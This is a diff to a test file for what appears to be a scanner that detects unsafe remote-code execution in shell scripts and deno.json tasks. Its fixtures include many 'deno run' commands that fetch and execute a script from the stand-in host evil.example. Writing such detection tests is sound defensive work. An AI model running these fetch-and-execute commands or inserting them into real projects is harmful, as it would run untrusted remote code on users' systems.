@@ -21,6 +21,54 @@ const RUNNERS: Record<string, { path: string; body: string }> = {
     path: "scripts/bootstrap.sh",
     body: "deno run -A https://evil.example/x.ts",
   },
+  "deno run --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-net https://evil.example/x.ts",
+  },
+  "deno run several permission flags URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-env --allow-net https://evil.example/x.ts",
+  },
+  "deno run --allow-net with a host list URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-net=evil.example https://evil.example/x.ts",
+  },
+  "deno run -A then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -A --allow-net https://evil.example/x.ts",
+  },
+  "deno run --unstable URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --unstable https://evil.example/x.ts",
+  },
+  "deno run -N URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -N https://evil.example/x.ts",
+  },
+  "deno run -N with a host list URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -N=evil.example https://evil.example/x.ts",
+  },
+  "deno run --allow-import then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-import --allow-net https://evil.example/x.ts",
+  },
+  "deno run -q then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -q --allow-net https://evil.example/x.ts",
+  },
+  "deno run --no-check then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --no-check --allow-net https://evil.example/x.ts",
+  },
+  "deno run --reload then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --reload --allow-net https://evil.example/x.ts",
+  },
+  "deno run --allow-net URL in a deno.json task": {
+    path: "deno.json",
+    body: '{"tasks":{"setup":"deno run --allow-net https://evil.example/x.ts"}}',
+  },
   "deno run URL in a deno.json task": {
     path: "deno.json",
     body: '{"tasks":{"setup":"deno run --allow-all https://evil.example/x.ts"}}',
@@ -82,9 +130,33 @@ test("running local or registry content keeps no unsafe-execution finding", () =
       path: "scripts/bootstrap.sh",
       body: "deno run --config https://example.com/deno.json ./local.ts",
     },
+    // A permission flag does not move the target: the URL after a local
+    // script is still script data, and a registry specifier is still
+    // dependency content.
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --allow-net ./local.ts https://api.example/data",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --allow-net npm:typescript@5.6.3/tsc",
+    },
+    // --no-remote forbids the fetch, so the URL cannot execute.
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --no-remote https://example.com/module.ts",
+    },
     {
       path: "scripts/bootstrap.sh",
       body: "deno run --help https://example.com/module.ts",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run -N ./local.ts https://api.example/data",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --no-check --no-remote https://example.com/module.ts",
     },
     {
       path: "scripts/bootstrap.sh",
